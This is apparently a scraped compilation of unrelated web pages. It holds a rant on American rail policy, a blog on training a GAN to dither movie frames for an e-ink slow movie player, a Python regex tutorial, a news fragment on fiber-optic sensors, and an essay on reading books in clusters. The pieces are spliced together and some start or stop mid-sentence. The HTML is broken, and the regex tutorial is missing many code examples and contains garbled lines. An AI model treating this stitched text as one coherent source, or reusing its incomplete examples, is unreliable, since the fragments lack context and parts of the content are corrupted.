normal—fast, energy-efficient rail service!—pretty much everywhere outside of this stupid and embarrassing country.</p>



<p>Everything about the broken incentives and hollowed-out capacities of American society is crystallized in this dumb pod moseying its way along a track to nowhere in Las Vegas. The United States has a problem: It is too dependent on inefficient, dirty, and expensive forms of transportation, because the vast majority of its people have no practical access to other kinds. Its infrastructure and the health of its communities are all jacked up by the necessity of splattering asphalt all over everything in order for people to drive their big dumb cars to, and park them near, anywhere they’d decide to go. It cannot achieve efficient levels of density or make meaningful turns toward environmental responsibility for as long as this is the case. Thankfully, a solution to this problem already exists and is in operation throughout other parts of the world with comparable levels of wealth and technological capacity: Trains! Networks of fast-moving trains that do not need internal combustion engines in order to move lots of people very quickly along their tracks! Companies and agencies make and install and operate these train systems, and have been doing so for a long time, longer even than the lifetime of the graybeard crap-bag writing this blog. They know how to do it! They can probably just be hired to do it. At some level somebody can probably just buy some of those trains, and install them, and turn them on, and take people from here to there on them.</p>



<p>But who could make it happen? Broke-dick, systematically impoverished municipalities, lashed to budget-balancing like a cinderblock tied to their feet? Close your eyes and try to imagine how a sane and obviously good decision like <em>Just import the TGV and run it between the big American cities instead of spending years and fortunes inventing maglev from scratch for no reason</em> could get made in these United States. Imagine who’d make it, and what their goals would be, and where the money would come from. It simply can’t get made on those terms. It can’t get made at all. No level of American society even has a mechanism for that anymore. If it doesn’t require a messianic assbrain with a Steve Jobs cosplay fantasy pitching some sleepy billionaire or venture capital firm on the possibility of cornering the market on a brand-new technology that will conquer the world, then it will not get done. If it merely delivers a profound benefit to the common good rather than the promise of extravagant enrichment to a shrinking class of hyper-powered parasites, then it simply cannot exist.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
  
<p>it's been about two years since i first saw the awesome
   <a href="https://medium.com/s/story/very-slow-movie-player-499f76c48b62">very slow movie player</a>
   project by bryan boyer. i thought it was such an excellent idea but never got around
   to buying the hardware to make one. more recently though i've seen a couple of references
   to the project so i decided it was finally time to make one.
</p>
<p>one interesting concern about an eink very slow movie player is the screen refresh. simpler
   eink screens refresh by doing a full cycle of a screen of white or black before displaying
   the new image. i hated the idea of an ambient slow player doing this every few minutes
   as it switched frames, so i wanted to make sure i got a piece of hardware that could do
   incremental update.
</p>
<p>after a bit of shopping around i settled on a
   <a href="https://www.waveshare.com/6inch-hd-e-paper-hat.htm">6 inch HD screen from waveshare</a>
</p>
<p>it ticks all the boxes i wanted
</p>
<ul>
 <li>
     6 inch
 </li>

 <li>
     1448×1072 high definition
 </li>

 <li>
     comes with a raspberry pi HAT
 </li>

 <li>
     and, most importantly, support partial refresh
 </li>
</ul>
<p>this screen also supports grey scale, but only with a flashy full cycle redraw,
   so i'm going to stick to just black and white since it supports the partial redraw.
</p>
<p>note: even though the partial redraw is basically instant it does suffer from a ghosting problem;
   when you draw a white pixel over a black one things are fine, but if you draw black over
   white, in the partial redraw, you get a slight ghosting of gray that is present until a
   full redraw :/
</p>


<p>so how do you display an image when you can only show black and white?
   dithering! here's an example of a 384x288 RGB image dithered using
   <a href="https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.Image.convert">PILS implementation of the Floyd-Steinberg algorithm</a>
</p>
<table>
<tbody><tr><td><img src="http://matpalm.com/blog/imgs/2020/dn/eg.dither.png"></td></tr>
<tr><td>original RGB vs dithered version</td></tr>
</tbody></table>

<p>it makes intuitive sense that you could have small variations in the exact locations of the
   dots as long as you get the densities generally right. s
   so there's a reasonable question then; how do you dither in such a way that you get a
   good result, but with minimal pixel changes from a previous frame? (since we're
   motivated on these screens to change as little as possible)
</p>
<p>there are two approaches i see
</p>
<p>1) spend 30 minutes googling for a solution that no doubt someone came up with 20 years
   ago that can be implemented in 10 lines of c running at 1000fps ...
</p>
<p>2) .... or train an
   <a href="https://jax.readthedocs.io/">jax</a>
   based GAN to generate the dithers with a loss balancing a good dither vs no pixel change. :P
</p>


<p>when building a very slow movie player the most critical decision is...
   what movie to play?
   i really love the 1979 classic <a href="https://www.imdb.com/title/tt0078748/">alien</a>,
   it's such a great dark movie, so i thought i'd go with it.
   the movie is 160,000 frames so at a play back rate of a frame every 200 seconds
   it'll take just over a year to finish.
</p>
<p>note that in this type of problem there is no concern around overfitting.
   we have access to all data going in and so it's fine to overfit as much as we like;
   as long as we're minimising whatever our objective is we're good to go.
</p>


<p>i started with a
   <a href="https://arxiv.org/abs/1505.04597">unet</a>
   that maps 3 channel RGB images to a single channel dither.
</p>
<table>
<tbody><tr><td><img src="http://matpalm.com/blog/imgs/2020/dn/models.v1.png"></td></tr>
<tr><td>v1 architecture</td></tr>
</tbody></table>

<p>i tinkered a bit with the architecture but didn't spend too much time tuning it.
   for the final v3 result i ended with a pretty vanilla stack of encoders &amp; decoders
   (with skip connections connecting an encoder to the decoder at the same spatial resolution)
   each encoder/decoder block uses a residual like shortcut around a couple of convolutions.
   nearest neighbour upsampling gave a nicer result than deconvolutions in the decoder
   for the v3 result.
   also, <a href="https://arxiv.org/abs/1606.08415">gelu</a> is my new favorite activation :)
</p>
<p>for v1 i used a binary cross entropy loss of P(white) per pixel
   ( since it's what worked well for my
   <a href="http://matpalm.com/blog/counting_bees/">bee counting project</a> )
</p>
<p>as always i started by overfitting to a single example to get a baseline feel for capacity required.
</p>

</tbody></table>

<p>when scaling up to the full dataset i switched to training on half resolution images
   against a patch size of 128. working on half resolution consistently gave a better
   result than working with the full resolution.
</p>
<p>as expected though this model gave us the classic type of problem we see with
   straight unet style image translation; we get a reasonable sense of the shapes, but no
   fine details around the dithering.

<p>side notes:
</p>
<ul>
 <li>
     for this v1 version using deconvolutions in the decoder
     (instead of nearest neighbour upsampling) actually looked pretty good!
     nicely captured texture for a dither with a surprisingly small network.
 </li>

 <li>
     i actually did some experiments using branches in the decoder for both upsampling
     and deconvolutions but the deconvs always dominated too much. i thought that would
     allow the upsampling to work as a kind of residual to the deconv but it never happened.

<p>for v2 i added a GAN objective in an attempt to capture finer details

<p>i started with the original
   <a href="https://arxiv.org/abs/1611.07004">pix2pix</a>
   objective but reasonably quickly moved to use a
   <a href="https://arxiv.org/abs/1701.07875">wasserstein</a>
   critic style objective since i've always found it more stable.
</p>
<p>the generator (G) was the same as the unet above with the discriminator (D) running patch based.
   at this point i also changed the reconstruction loss from a binary objective to just L1.
   i ended up using batchnorm in D, but not G.
   to be honest i only did a little did of manual tuning, i'm sure there's a better result
   hidden in the hyperparameters somewhere.
</p>
<p>so, for this version, the loss for G has two components
</p>
<pre>1. D(G(rgb))             # fool D
2. L1(G(rgb), dither)    # reconstruct the dither
</pre>

<p>very quickly (i.e. in &lt; 10mins ) we get a reasonable result that is started to
   show some more detail than just the blobby reconstruction.
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/v2.eg.png">
</td></tr>
<tr><td>
v2 partial trained eg

</tbody></table>

<p>note: if the loss weight of 2) is 0 we degenerate to v1
   (which proved a useful intermediate debugging step).
   at this point i didn't want to tune to much since the final v3 is coming...
</p>


<p>for v3 we finally introduce a loss relating the previous frame
   (which was one of the main intentions of the project in the first place)
</p>
<p>now G takes not just the RGB image, but the dither of the previous frame.
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/models.v3.png">
</td></tr>
<tr><td>
v3 architecture
</td></tr>
</tbody></table>

<p>the loss for G now has three parts
</p>
<pre>1. D(G(rgb_t1)) =&gt; real      # fool D
2. L1(G(rgb_t1), dither_t1)  # reconstruct the dither
3. L1(G(rgb_t1), dither_t0)  # don't change too much from the last frame
</pre>

<p>normally with a network that takes as input the same thing it's outputting
   we have to be careful to include things like teacher forcing.
   but since we don't intend to use this network for any kind of rollouts
   we can just always feed the "true" dithers in where required.
   having said that, rolling out the dithers from this network would be interesting :D
</p>


<p>the third loss objective, not changing too many pixels from the last frame,
   works well for generally stationary shots
   but is disastrous for scene changes :/
</p>
<p>consider the following graph for a sequence of frames showing the pixel difference
   between frames.
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/pixel_diff_between_scenes.png"></p><p>when there is a scene change we observe a clear "spike" in pixel diff. my first thought
   was to look for these and do a full redraw for them. it's very straightforward to
   find them (using a simple z-score based anomaly detector on a sliding window) but
   the problem is that it doesn't pick up the troublesome case of a panning shot where we don't
   have a scene change exactly. in these cases there is no abrupt scene change, but there
   are a lot of pixels changing so we end up seeing a lot of ghosting.
</p>
<p>i spent ages tinkering with the best way to approach this before deciding that a simple
   approach of <code>num_pixels_changed_since_last_redraw &gt; threshold</code> was good enough to decide
   if a full redraw was required (with a cooldown to ensure we not redrawing all the time)
</p>


<p>the v3 network gets a very good result <em>very</em> quickly; unsurprisingly since the dither at time
   t0 provided to G is a pretty good estimate of the dither at t1 :)
   i.e. G can get a good result simply by copying it!
</p>
<p>the following scenario shows this effect...
</p>
<p>consider three sequential frames, the middle one being a scene change.
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/v3.scene_eg.1.png"></p><p>at the very start of training the reconstruction loss is dominant and
   we get blobby outlines of the frame.
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/v3.scene_eg.2.png"></p><p>but as the contribution from the dither at time t0 kicks it things look good in general but
   the frames at the scene change end up being a ghosted mix attempt to copy through the old
   frame along with dithering the new one.
   (depending on the relative strength of the loss terms of G).
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/v3.scene_eg.3.png"></p>
<p>so the v3 version generally works and i'm sure with some more tuning i could get a better result
   but, as luck would have it, i actually find the results from v2 more appealing when testing
   on the actual eink screen. so even though the intention was do something like v3 i'm going to end
   up running something more like v2 (as shown in these couple of examples (though the resolution
   does it no justice (not to mention the fact the player will run about 5000 times slower than these
   gifs)))
</p>




<p>i'll update this section when i get a proper frame made (though i might try myself?) but for now the
   prototype lives balanced precariously on a piece of foam below it's younger sibling pi zero eink screen
   running game of life.

<ul>
 <li>
     for reconstruction and frame change i used L1 loss, but that's not exactly what we
     want. since we want to avoid the ghosting (white changing to black resulting in grey)
     we should try to avoid white to black but ignore black to white.
 </li>

 <li>
     we might be able to better handle scene changes by also including a
     loss component around the <em>next</em> frame.
 </li>

 <li>
     there's a padding issue where i train G on patches but when it's run on the full res
     version we get an edge artefact the size of the original patch (see image below).
     as a hacky fix i just padded the RGB image before passing it to …</li></ul></div></div>

November 13, 2020 | https://amitness.com/regex/ | <a href="https://web.archive.org/web/*/https://amitness.com/regex/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
<p>It’s a common task in NLP to either check a text against a pattern or extract parts from the text that matches a certain pattern. A regular expression or “regex” is a powerful tool to achieve this.</p>
<p>While powerful, regex can feel daunting as it comes with a lot of features and sub-parts that you need to remember.</p>
<p>In this post, I will illustrate the various concepts underlying regex. The goal is to help you build a good mental model of how a regex pattern works.</p>
<h2 id="mental-model">Mental Model</h2>
<p>Let’s start with a simple example where we are trying to find the word ‘cool’ in the text.</p>
<p><img src="https://amitness.com/images/regex-mental-model-example.png" alt=""></p>
<p>With regex, we could simply type out the word ‘cool’ as the pattern and it will match the word.</p>

<p>While regex matched our desired word ‘<strong>cool</strong>’, the way it operates is not at the word level but the character level. This is the key idea.</p>
<blockquote>
<p><strong>Key Idea</strong>: Regex works at the character-level, not word-level.</p>
</blockquote>
<p><img src="https://amitness.com/images/regex-working.png" alt=""></p>
<p>The implication of this is that the regex <code>r'cool'</code> would match the following sentences as well.</p>
<p><img src="https://amitness.com/images/regex-exact-word-match.png" alt=""></p>
<h2 id="basic-building-blocks">Basic Building Blocks</h2>
<p>Now that we understand the key idea, let’s understand how we can match simple characters using regex.</p>
<h3 id="a-specific-character">a. Specific character</h3>
<p>We can simply specify the character in the regular expression and it will match all instances in the text.</p>
<p>For example, a regular expression given below will match all instances of ‘a’ in the text. You can use any of the small and capital alphabets.</p>

<p><img src="https://amitness.com/images/regex-match-only-a.png" alt=""></p>
<p>You can also use any digits from 0 to 9 and it will work as well.</p>

<p><img src="https://amitness.com/images/regex-python-3.7-example.png" alt=""></p>
<p>Note that regex is case-sensitive by default and thus the following regex won’t match anything.</p>

<p><img src="https://amitness.com/images/regex-not-matched-by-capital-a.png" alt=""></p>
<h3 id="b-white-space-character">b. White space character</h3>
<p>We can detect special characters such as whitespace and newlines using special escape sequences.</p>
<p><img src="https://amitness.com/images/regex-white-space-characters.png" alt=""></p>
<p>Besides the common ones above, we have:</p>
<ul>
<li><strong>\r</strong> for carriage return</li>
<li><strong>\f</strong> for form feed</li>
<li><strong>\e</strong> for escape.</li>
</ul>
<h3 id="c-special-sequences">c. Special sequences</h3>
<p>Regex provides a bunch of built-in special symbols that can match a group of characters at once. These begin with backslash <code>\</code>.</p>
<h4 id="pattern-d">Pattern: <code>\d</code></h4>
<p>It matches any single-digit number between 0 to 9.</p>
<p><img src="https://amitness.com/images/regex-single-digit.png" alt=""></p>
<p>Notice that matches are single digit. So we have 4 different matches below instead of a single number <code>18.04</code>.</p>
<p><img src="https://amitness.com/images/regex-ubuntu-18.04.png" alt=""></p>
<h4 id="pattern-s">Pattern: \s</h4>
<p>It matches any whitespace character (<span>space</span>, <span>tab</span> or <span>newline</span>).</p>
<p><img src="https://amitness.com/images/regex-match-any-whitespace.png" alt=""></p>
<h4 id="pattern-w">Pattern: \w</h4>
<p>It matches any of the small alphabets(a to z), capital alphabets(A to Z), digits (0 to 9), and underscore.</p>
<p><img src="https://amitness.com/images/regex-slash-w.png" alt=""></p>
<h4 id="pattern-">Pattern: .</h4>
<p>It matches any character except the new line (\n).</p>
<p><img src="https://amitness.com/images/regex-everything-except-newline.png" alt=""></p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>&gt;&gt;&gt;</span> <span>re</span><span>.</span><span>findall</span><span>(</span><span>r'.'</span><span>,</span> <span>'line 1</span><span>\n</span><span>line2'</span><span>)</span>
<span>[</span><span>'l'</span><span>,</span> <span>'i'</span><span>,</span> <span>'n'</span><span>,</span> <span>'e'</span><span>,</span> <span>' '</span><span>,</span> <span>'1'</span><span>,</span> <span>'l'</span><span>,</span> <span>'i'</span><span>,</span> <span>'n'</span><span>,</span> <span>'e'</span><span>,</span> <span>'2'</span><span>]</span>
</code></pre></div></div>
<h4 id="pattern-negations">Pattern: Negations</h4>
<p>If you use the capitalized versions of the patterns above, they act as negation.</p>
<p>For example, if “\d” matched any digits from 0 to 9, then “\D” will match anything except “0 to 9”.</p>
<p><img src="https://amitness.com/images/regex-negation.png" alt=""></p>
<h3 id="d-character-sets">d. Character sets</h3>
<p>These are patterns starting with <code>[</code> and ending with <code>]</code> and specify the characters that should be matched enclosed by brackets.</p>
<p>For example, the following pattern matches any of the characters ‘a’, ‘e’, ‘i’, ‘o’, and ‘u’.
<img src="https://amitness.com/images/regex-aeiou.png" alt=""></p>
<p>You can also replicate the functionality of <code>\d</code> using the below pattern. It will match any digits between 0 to 9.
<img src="https://amitness.com/images/regex-1-to-9.png" alt=""></p>
<p>Instead of specifying all the digits, we can use <code>-</code> to specify only start and end digits. So, instead of <code>[0123456789]</code>, we can do:</p>
<p><img src="https://amitness.com/images/regex-refactor-all-digits.png" alt=""></p>
<p>For example, <code>[2-4]</code> can be used to match any digits between 2 to 4 i.e. (2 or 3 or 4).</p>
<p><img src="https://amitness.com/images/regex-year-2014-example.png" alt=""></p>
<p>You can even use the special characters we learned previously inside the brackets. For example, you can match any digit from 0 to 9 or whitespace as:</p>
<p><img src="https://amitness.com/images/regex-whitespace-or-digit.png" alt=""></p>
<p>Below, I have listed some useful common patterns and what they mean.</p>
<p><img src="https://amitness.com/images/regex-common-pattern-for-bracket.png" alt=""></p>
<h3 id="e-anchors">e. Anchors</h3>
<p>Regex also has special handlers to make the pattern only match if it’s at the start or end of the string.</p>
<p>We can use the <code>^</code> anchor to match patterns only at the start of a line. For example:</p>
<p><img src="https://amitness.com/images/regex-start-anchor.png" alt=""></p>
<p>Similarly, we can use the <code>$</code> anchor after the character to match patterns only if it’s the end of the line. For example:</p>
<p><img src="https://amitness.com/images/regex-anchor-end.png" alt=""></p>
<h3 id="f-escaping-metacharacters">f. Escaping metacharacters</h3>
<p>Consider a case where we want to exactly match the word “Mr. Stark”.</p>
<p>If we write a regex like <code>Mr. Stark</code>, then it will have an unintended effect. Since we know dot has a special meaning in a regex.</p>
<p><img src="https://amitness.com/images/regex-dot-issue.png" alt=""></p>
<p>So, we should always escape the special metacharacters like <code>.</code>, <code>$</code> etc. if our goal is to match the exact character itself.</p>
<p><img src="https://amitness.com/images/regex-dot-fixed.png" alt=""></p>
<p>Here is the list of metacharacters that you should remember to escape if you’re using them directly.</p>
<div><div><pre><code>^ $ . * + ? { } [ ] \ | ( )
</code></pre></div></div>
<h2 id="repetition-of-basic-blocks">Repetition of basic blocks</h2>
<p>Now that we can pattern match any characters, we could repeat things and start building more complicated patterns.</p>
<h3 id="a-naive-repetition">a. Naive repetition</h3>
<p>Using only what we have learned so far, a naive way would be to just repeat the pattern. For example, we can match two-digit numbers by just repeating the character-level pattern.</p>

<p><img src="https://amitness.com/images/regex-slash-d-slash-d.png" alt=""></p>
<h3 id="b-quantifiers">b. Quantifiers</h3>
<p>Regex provides special quantifiers to specify different types of repetition for the character preceding it.</p>
<h4 id="i-fixed-repetition">i. Fixed repetition</h4>
<p>We can use the <code>{...}</code> quantifier to specify the number of times a pattern should repeat.</p>
<p><img src="https://amitness.com/images/regex-manual-counts.png" alt=""></p>
<p>For example, the previous pattern for matching 2-digit number can be recreated as:</p>
<p><img src="https://amitness.com/images/regex-it-is-2020.png" alt=""></p>
<p>You can also specify a range of repetitions using the same quantifier. For example, to match from 2-digit to 4-digit numbers, we could use the pattern:</p>
<p><img src="https://amitness.com/images/regex-min-max-count.png" alt=""></p>
<p>When applied to a sentence, it will match both 4-digit and 2-digit numbers.</p>
<p><img src="https://amitness.com/images/regex-20-years-old.png" alt=""></p>
<div>
<p><strong>Note:</strong></p><p>
There should not be any space between minimum and maximum count For example, \d{2, 4} doesn't work.
</p>
</div>
<h4 id="ii-flexible-quantifiers">ii. Flexible quantifiers</h4>
<p>Regex also provides quantifiers “*”, “+” and “?” using which you can specify flexible repetition of a character.</p>
<ul>
<li>
<p><strong>0 or 1 times</strong>: <code>?</code><br>
The <code>?</code> quantifier matches the previous character if it repeats 0 or 1 times. This can be useful to make certain parts optional. It is equivalent to <code>{0,1}</code>.</p>
<p><img src="https://amitness.com/images/regex-question-mark-clarify.png" alt=""></p>
<p>For example, let’s say we want to match both the word “sound” and “sound” where “s” is optional. Then, we can use the <code>?</code> quantifier that matches if a character repeats 0 or 1 times.<br>
<img src="https://amitness.com/images/regex-question-mark-example.png" alt=""></p>
</li>
<li>
<p><strong>one or more times</strong>: <code>+</code><br>
The <code>+</code> quantifier matches the previous character if it repeats 1 or more times. It is equivalent to <code>{1,}</code>.</p>
<p>For example, we could find numbers of any arbitrary length using the regex <code>\d+</code>.</p>
<p><img src="https://amitness.com/images/regex-example-of-plus.png" alt=""></p>
</li>
<li>
<p><strong>zero or more times</strong>: <code>*</code><br>
The <code>*</code> quantifier matches the previous character if it repeats zero or more times. It is equivalent to <code>{0,}</code>.</p>
</li>
</ul>
<h2 id="usage-in-python">Usage in Python</h2>
<p>Python provides a module called “re” in the standard library to work with regular expression.</p>
<h3 id="need-for-raw-strings">Need for raw strings</h3>
<p>To specify a regular expression in Python, we precede it with <strong>r</strong> to create raw strings.</p>

<p>To understand why we precede with <strong>r</strong>, let’s try printing the expression <strong>\t</strong> without <code>**r**</code>.</p>
<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>pattern</span> <span>=</span> <span>'</span><span>\t</span><span>'</span>
<span>&gt;&gt;&gt;</span> <span>print</span><span>(</span><span>pattern</span><span>)</span>

</code></pre></div></div>
<p>You can see how when we don’t use raw string, the string <code>\t</code> is treated as the escape character for tab by Python.</p>
<p>Now let’s convert it into raw string. We get back whatever we specified.</p>
<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>pattern</span> <span>=</span> <span>r'\t'</span>
<span>&gt;&gt;&gt;</span> <span>print</span><span>(</span><span>pattern</span><span>)</span>
\<span>t</span>
</code></pre></div></div>
<h3 id="using-re-module">Using re module</h3>
<p>To use <code>re</code> module, we can start by importing the <code>re</code> module as:</p>

<h4 id="1-refindall">1. re.findall</h4>
<p>This function allows us to get all the matches as a list of strings.</p>
<div><div><pre><code><span>import</span> <span>re</span>
<span>re</span><span>.</span><span>findall</span><span>(</span><span>r'\d'</span><span>,</span> <span>'123456'</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code>['1', '2', '3', '4', '5', '6']
</code></pre></div></div>
<h4 id="2-rematch">2. re.match</h4>
<p>This function searches for a pattern at the beginning of the string and returns the first occurrence as a match object. If the pattern is not found, it returns None.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>match</span><span>(</span><span>r'batman'</span><span>,</span> <span>'batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code>&lt;re.Match object; span=(0, 6), match='batman'&gt;
</code></pre></div></div>
<p><img src="https://amitness.com/images/regex-match-object.png" alt=""></p>
<p>With the match object, we can get the matched text as</p>


<p>In a case where our pattern is not at the start of the sentence, we will not get any match.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>match</span><span>(</span><span>r'batman'</span><span>,</span> <span>'The batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>)</span>
</code></pre></div></div>

<h4 id="3-research">3. re.search</h4>
<p>This function also finds the first occurrence of a pattern but the pattern can occur anywhere in the text. If the pattern is not found, it returns None.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>search</span><span>(</span><span>r'batman'</span><span>,</span> <span>'the batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>.</span><span>group</span><span>())</span>
</code></pre></div></div>

The sensors can take temperature readings everywhere a fiber is placed, thereby generating a continuous heat diagram of a given site – even if the site stretches for dozens of kilometers. That provides crucial insight into possible accidents before they happen.</p><h2><b>Improving signal quality</b></h2><p>Working in association with the <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fenglish.bupt.edu.cn%2F&amp;t=Mzk1MTNmZTg0ZWY1NGRkMTI4Yzk3NDY3YmJmZjI5ZWMzOTYyZjBlZCx6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605515034">Beijing University of Posts and Telecommunications</a>, two GFO engineers – postdoc Zhisheng Yang and PhD student Simon Zaslawski – developed a new system for encoding and decoding data sent along the fibers. With their method, sensors can receive higher-energy signals and decode them faster, resulting in measurements taken more rapidly and over a larger area. Their research <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41467-020-19201-1&amp;t=N2I0ZmNjOWRlOTk0MTRkNTM0OGM5Y2M5OTA3NGRmOGY4Nzk5YjNhNCx6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605515034">has just been published in <i>Nature Communications</i>.</a></p><p>The engineers describe their system as working like an echo. If you shout a single word, you hear that word back. But if you sing out a song, what you hear back is a blend of sounds that are hard to distinguish. You would need a “key” to decipher the sounds and make them intelligible. Fiber optic sensors function in a similar manner, except that an instrument sends out light pulses – rather than sounds – along a fiber. Signals bounce back up the fiber and a device decodes them, turning the signals into usable data.</p><p>To make the sensors more efficient, Yang and Zaslawski grouped the light pulses into sequences so that the signals bounce back with greater intensity. However, that didn’t solve the “echo” problem – that is, finding a key to make the signals readable. So they developed a method for encoding the data sent along a fiber; their method employs special genetic optimization algorithms to cope with imperfections. “Other systems are either limited in scope or expensive,” says Thévenaz. “But with ours, you just have to add a software program to your existing equipment. No need to adapt your sensors or use complex devices.”</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Factu.epfl.ch%2Fnews%2Fnew-fiber-optic-sensors-transmit-data-up-to-100-ti%2F&amp;t=ZjNiZjdjMjg3MWI3Nzk5YjliNTM2MDFlZjRmM2E1ZGYwOGM2NzQwNix6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605515034">École polytechnique fédérale de Lausanne (EPFL)</a></b></p><p><b>Full study:</b>&nbsp;“Genetic-optimised aperiodic code for distributed optical fibre sensors”, <i>Nature Communications</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1038%2Fs41467-020-19201-1&amp;t=MzgyMGI0MzMzMGQ5ZGJlNWE3ZWZkMTEwYmNkNTJjOWZlN2I5Yzg1Yix6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605515034">https://doi.org/10.1038/s41467-020-19201-1</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/627187404240027648/world-record-internet-speed-record-set-by-ucl-scientists">New world record internet speed set</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I try to read a lot, though I'm not nearly as voracious a reader as people who have a reputation for it. I have no idea how Marc Andreessen or Patrick Collison read as much as they do, especially given the enormous demands on their time. The most plausible explanation is that they're aliens with ungodly information processing abilities. I'm human, so I shoot for 40 pages every day, and fail maybe a third of the time. That works out to about 10,000 pages or ~20 books every year. </p><p>Reading twenty books a year gets you a lot. Consider: one book gives you more knowledge about a subject than almost every other person on the planet, because people don't read. Two books on the same subject give you more knowledge than almost any reader, because people don't read two books about the same thing. How many people who read The Power Broker went on to read a second book about Robert Moses? I'd wager not many.</p><p>Beyond two books on a subject, there is a long utility dip. People who bothered to read more than two books about Robert Moses, are either obsessed with him or study him for a living, which means they've read much, much more about him. So two books on a subject, at least with respect to competitive edge, is an inflection point. After you read two, you get diminishing returns.</p><p>There is a way to get around this limitation. A single book is a pinhole view of the world set up by the author. You have no input into its contents, and therefore cannot change the orientation of this view. But you do choose the books you select. That means you can stitch together multiple pinhole views into a unique lens to examine the world— one that no one else will have unless they use the same list of books to stitch together the same lens. </p><p>For example, you can look at the world through history of technology that became ubiquitous. Here is one possible list of books to stitch together this lens: <a href="https://amzn.to/36fB6Vb">The Victorian Internet</a>, <a href="https://amzn.to/2GHE8Jh">Empires of Light</a>, <a href="https://amzn.to/2Ua2P49">The Wright Brothers</a>, <a href="https://amzn.to/38pdoIY">The Network</a>, <a href="https://amzn.to/3n3SeEf">Hackers</a>. Very few people in the world read all five of these books. Even within Silicon Valley, where everyone's living depends on creating new ubiquitous technology, your understanding of how technology becomes ubiquitous will be in the 95th percentile (and likely higher) if you read these five. You will now be armed with a unique instrument that few others possess, and assuming twenty books per year, it only took you three months to acquire.</p><p>Another example is to look at American history and the dynamics of failure by studying biographies of U.S. presidents who sought reelection and lost. There were ten: John Adams, John Quincy Adams, Martin Van Buren, Benjamin Harrison, William H. Taft, Herbert Hoover, Gerald Ford, Jimmy Carter, George H.W. Bush, and now Donald J. Trump. It may be difficult to stomach ten presidential biographies in a row, but it's doable to read five. That's enough to pick up a new lens. Another three months; another sophisticated instrument to examine the world at your disposal.</p><p>I settled on clusters of five and almost never read a single book in isolation. Less than five feel lacking; more than five gets repetitive. Every cluster has a goal of the form "study <code>X</code> through <code>Y</code>". Study American history through technological expansion, or study failure through one term presidents are just a few examples. I try to be creative and make <code>Y</code> unusual. For instance, everyone likes to read about presidents who are believed to be successful. A simple trick is to inverse it and read about unsuccessful ones instead. Or skip the presidents altogether, and read about vice presidents. It doesn't matter what <code>Y</code> is because you're trying to study <code>X</code>, and it's more fun to make <code>Y</code> unusual.</p><p>I don't bother diversifying books within a cluster by time period, cultural or linguistic background of the author, or anything like that. I simply try and find the best books on the subject. Sometimes they turn out to be diverse along some axes; other times they're homogenous. I never read forewords or prefaces and always finish every book in a cluster. I prefer paper to digital, and used books to new ones. I never take notes or, god forbid, create flashcards. My goal is to suck the juice out of a book, not to hold on to pieces of the carcass. If I ever need to remember a specific detail, it's always waiting for me on the shelf.</p><p>This system gives me four new instruments per year, each capable of inspecting the world in a different way. Rather than pick the instruments at random I try to be strategic and collect them into a mental lab. I visualize the lab as a room with multiple stations. Each station has a collection of related instruments on it. When I'm faced with a problem I can go to the right station and examine the problem through the instruments available on that station. All this is physically materialized on my bookshelf. Some day when I become less mobile, I plan to dedicate a literal room to it.</p><p>I don't maintain lists of books I want to read, and don't plan a sequence of instruments to acquire in advance. Once I'm done reading a cluster of books, I ask myself: <em>what instrument can I add to double the utility of my lab</em>? Another way to phrase this question is "what is the most important subject that I know the least about?" It's easy to think of many possible answers to this question; I then pick the answer that seems the most interesting, construct a new cluster of five books, and recurse.</p><p>Four instruments per year may not seem like much, but consider: in five years you will have about twenty mental instruments, all of which interrelate and reinforce each other. In ten years you will have an impressive lab of forty instruments. And it will be unique— no other mental lab on the planet will be able to inspect the world in the way that yours can.</p><p>Because the instruments are constructed from books, they are endlessly upgradeable. Sometimes you might choose to upgrade an existing instrument to increase its power and get higher resolution, rather than acquire a new one. You can do that one book at a time. To use the examples above, you can read 